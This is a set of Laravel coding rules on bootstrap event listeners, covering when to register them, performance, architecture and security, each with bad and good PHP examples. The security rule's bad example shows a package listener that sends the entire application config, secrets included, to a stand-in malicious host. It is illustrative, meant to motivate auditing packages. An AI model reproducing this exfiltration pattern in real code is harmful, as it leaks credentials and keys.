# Bootstrap With Event System Rules

## Rule 1: Register Bootstrap Listeners Before Bootstrappers Run
---
## Category
Framework Usage
---
## Rule
Always register bootstrap event listeners in a service provider's `register()` method or in `bootstrap/app.php`, never in `boot()`.
---
## Reason
Bootstrap events (`bootstrapping:*`, `bootstrapped:*`) are dispatched during the kernel's bootstrap pipeline, which runs before any provider's `boot()` is called. Listeners registered in `boot()` are too late — the events have already fired.
---
## Bad Example
```php
public function boot()
{
    // Too late — bootstrap events have already fired
    $this->app['events']->listen('bootstrapped: bootProviders', function ($app) {
        logger('Bootstrap complete');
    });
}
```
---
## Good Example
```php
public function register()
{
    // Correct: registered before bootstrap pipeline runs
    $this->app['events']->listen('bootstrapped: bootProviders', function ($app) {
        logger('Bootstrap complete');
    });
}
```
---
## Exceptions
No common exceptions.
---
## Consequences Of Violation
Listener silently never executes. Developers waste debugging time wondering why bootstrap-phase monitoring code does not fire.
---

## Rule 2: Keep Bootstrap Event Listeners Lightweight
---
## Category
Performance
---
## Rule
Never perform heavy I/O (database queries, API calls, file writing) inside bootstrap event listeners.
---
## Reason
Bootstrap events execute in the critical path before any middleware or application code runs. Every microsecond spent in a bootstrap listener directly delays every request's time-to-first-byte.
---
## Bad Example
```php
$this->app['events']->listen('bootstrapped: loadConfiguration', function ($app) {
    DB::table('audit_log')->insert(['event' => 'config_loaded', 'time' => now()]);
});
```
---
## Good Example
```php
$this->app['events']->listen('bootstrapped: loadConfiguration', function ($app) {
    // Lightweight: set a flag or increment a counter
    $app->instance('bootstrap.config_loaded', microtime(true));
});
```
---
## Exceptions
Octane deployments where bootstrap events fire once per worker start — the cost is amortized across thousands of requests.
---
## Consequences Of Violation
Every request delayed by listener execution time. Increased server costs and degraded response times.
---

## Rule 3: Use Specific Bootstrap Event Names, Not Wildcards
---
## Category
Performance
---
## Rule
Prefer listening to specific bootstrap event names (e.g., `bootstrapped: loadConfiguration`) over wildcard patterns.
---
## Reason
Wildcard listeners (`bootstrapping:*`, `bootstrapped:*`) match every bootstrapper event, adding dispatch overhead to all 12 core bootstrap events regardless of which event is relevant.
---
## Bad Example
```php
$this->app['events']->listen('bootstrapping:*', function ($app) {
    // Fires 6 times — once per bootstrapper
    logger('Bootstrapping step');
});
```
---
## Good Example
```php
$this->app['events']->listen('bootstrapped: bootProviders', function ($app) {
    // Fires once — only for the relevant bootstrapper
    logger('Providers finished booting');
});
```
---
## Exceptions
Debugging or profiling scenarios where you intentionally need to observe all bootstrap steps.
---
## Consequences Of Violation
Unnecessary event dispatch overhead on every request. Wildcard listeners mask which specific events are being observed, making debugging harder.
---

## Rule 4: Prefer Provider boot() Over Bootstrap Events for Application Setup
---
## Category
Architecture
---
## Rule
Prefer using a service provider's `boot()` method over bootstrap event listeners for application initialization logic.
---
## Reason
The provider system is the intended extension point for application code. Bootstrap events are designed for monitoring, profiling, and cross-cutting concerns — not for general initialization. Using `boot()` ensures your code runs in the correct context with all services available.
---
## Bad Example
```php
// Using bootstrap event for application initialization
$this->app['events']->listen('bootstrapped: bootProviders', function ($app) {
    Gate::define('admin', fn($user) => $user->is_admin);
    Route::middleware('web')->group(base_path('routes/web.php'));
});
```
---
## Good Example
```php
// Using provider boot() for initialization
public function boot()
{
    Gate::define('admin', fn($user) => $user->is_admin);
    Route::middleware('web')->group(base_path('routes/web.php'));
}
```
---
## Exceptions
When you need to observe the entire bootstrap phase from a third-party package that cannot add its own service provider.
---
## Consequences Of Violation
Initialization code is harder to discover and maintain. Bootstrap listeners accumulate in unexpected places, making the bootstrap sequence harder to understand.
---

## Rule 5: Do Not Modify Container Bindings in Bootstrap Event Listeners
---
## Category
Architecture
---
## Rule
Never register container bindings or modify the container's service configuration inside bootstrap event listeners.
---
## Reason
Bootstrap listeners execute during the kernel's bootstrap pipeline, before or between bootstrappers. Bindings added here may conflict with provider-registered bindings, creating order-dependent behavior that is difficult to reproduce and debug.
---
## Bad Example
```php
$this->app['events']->listen('bootstrapping: registerProviders', function ($app) {
    $app->singleton(DatabaseLogger::class, fn() => new DatabaseLogger()); // Oops — bindings in event listener
});
```
---
## Good Example
```php
public function register()
{
    $this->app->singleton(DatabaseLogger::class, fn() => new DatabaseLogger());
}
```
---
## Exceptions
Overriding configuration values before `LoadConfiguration` runs (e.g., forcing environment detection) — this is the one intended use case.
---
## Consequences Of Violation
Non-deterministic binding resolution. Bindings may or may not be present depending on listener registration order. Binding conflicts are hard to debug.
---

## Rule 6: Audit Third-Party Package Bootstrap Listeners
---
## Category
Security
---
## Rule
Audit bootstrap event listeners registered by third-party packages for data leakage and performance impact.
---
## Reason
Bootstrap event listeners have access to the raw Application instance before any security middleware runs. A malicious or compromised package can observe sensitive configuration or modify application state undetected.
---
## Bad Example
```php
// In a package's service provider
public function register()
{
    $this->app['events']->listen('bootstrapped: loadConfiguration', function ($app) {
        Http::post('https://malicious.example.com/collect', [
            'config' => $app['config']->all(), // Exfiltrates all config including secrets
        ]);
    });
}
```
---
## Good Example
```php
// Explicitly audit packages that use bootstrap events
// composer.json: "require": { "trusted/package": "^1.0" }
// Check package source for bootstrap event listeners before installation
```
---
## Exceptions
No common exceptions.
---
## Consequences Of Violation
Sensitive data (API keys, database credentials, encryption keys) leaked via bootstrap event listeners. Undetected data exfiltration.
